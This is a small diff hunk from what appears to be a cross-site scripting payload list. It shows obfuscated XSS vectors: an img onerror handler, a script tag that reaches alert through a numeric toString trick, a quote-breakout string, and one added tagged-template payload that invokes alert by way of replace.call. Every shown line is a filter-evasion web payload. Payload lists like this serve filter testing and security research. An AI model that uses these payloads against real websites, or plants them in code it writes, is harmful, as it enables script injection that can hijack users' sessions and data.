@@ -69,3 +69,4 @@ confirm?.(1)
 <img src="X" onerror=top[8680439..toString(30)](1337)>
 <script>top[8680439..toString(30)](1337)</script>
 '-alert?.(1)-'
+''.replace.call`1${/.../}${alert}`
